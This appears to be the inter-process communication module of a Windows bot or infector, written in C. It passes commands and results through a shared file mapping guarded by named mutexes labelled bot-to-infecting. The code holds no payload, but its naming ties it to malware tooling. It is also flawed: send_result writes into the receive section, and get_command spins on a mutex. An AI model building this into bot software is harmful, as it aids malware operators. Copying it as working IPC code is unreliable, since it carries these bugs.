#include "ipc_manage.h"

#include <stdio.h> //Debug
#include <Windows.h>

#define MUTEX_RECEIVING "MUTEX_BOT_TO_INFECTING"
#define MUTEX_SENDING "MUTEX_INFECTING_TO_BOT"

static HANDLE hFileMap;
static HANDLE hMutexRecv;
static HANDLE hMutexSend;
static PCHAR lpBufferSend;
static PCHAR lpBufferRecv;
static size_t szBufferRecv = 100;
static size_t szBufferSend = 900;

int connect_to_parent_process()
{
	PCHAR send_section;
	
	//Creating Mutexes
	hMutexRecv = CreateMutexA(NULL, FALSE, MUTEX_RECEIVING);
	hMutexSend = CreateMutexA(NULL, FALSE, MUTEX_SENDING);

	if (hMutexRecv == NULL || hMutexSend == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "connect_to...: CreateMutex failed error no.", GetLastError());
#endif
		return 1;
	}

	//STEP-1 OpenFileMapping
	hFileMap = OpenFileMapping(
		FILE_MAP_ALL_ACCESS,
		FALSE,
		L"Local\\COVID-20"
	);

	if (hFileMap == FALSE)
	{
#ifdef _DEBUG
		printf("%s %d\n", "connect_to...: CreateFileMapping failed error no.", GetLastError());
#endif
		return 1;
	}

	//take control
	WaitForSingleObject(hMutexSend, INFINITE);

	//STEP-2 MapViewOfFile
	lpBufferSend = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferRecv + szBufferSend
	);

	if (lpBufferSend == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "connect_to...: MapViewOfFile failed error no.", GetLastError());
#endif
		return 1;
	}

	//point to send section
	send_section = lpBufferSend + szBufferRecv;

	//copy memory (for test)
	CopyMemory(send_section, MUTEX_SENDING, strlen(MUTEX_SENDING));

	//STEP-3 UnmapViewOfFile
	UnmapViewOfFile(lpBufferSend);

	//finished reading data
	ReleaseMutex(hMutexSend);
	return 0;
}

int send_result(uint8_t* buffer, uint32_t size)
{
	PCHAR sending_section;

	//waiting for the Bot process finish reading
	WaitForSingleObject(hMutexSend, INFINITE);

	//Create MapViewOfFile
	lpBufferSend = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferSend + szBufferRecv
	);

	if (lpBufferSend == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "send_result: MapViewOfFile failed error no.", GetLastError());
#endif
		return 1;
	}

	sending_section = lpBufferSend + szBufferRecv;

	//copy data
	CopyMemory(lpBufferSend, buffer, size);

	//Write changes
	UnmapViewOfFile(lpBufferSend);

	//release mutex
	ReleaseMutex(hMutexSend);
	return 0;
}

int get_command(uint8_t* buffer, uint32_t size)
{
	DWORD res;
	do
	{
		res = WaitForSingleObject(hMutexRecv, 0);
		ReleaseMutex(hMutexRecv);
	} while (res == WAIT_OBJECT_0);
	
	//wait for the Bot process finish writing
	WaitForSingleObject(hMutexRecv, INFINITE);

	lpBufferRecv = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferSend + szBufferRecv
	);

	if (lpBufferRecv == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "IPC_INIT: MapViewOfFile failed error no.", GetLastError());
#endif
		return 1;
	}

	//read data
	CopyMemory(buffer, lpBufferRecv, size);
	for (size_t i = 0; i < size; i++)
	{
		printf("%c", buffer[i]);
	}
	//UnmapViewOfFile
	UnmapViewOfFile(lpBufferRecv);

	ReleaseMutex(hMutexRecv);
	return 0;
}
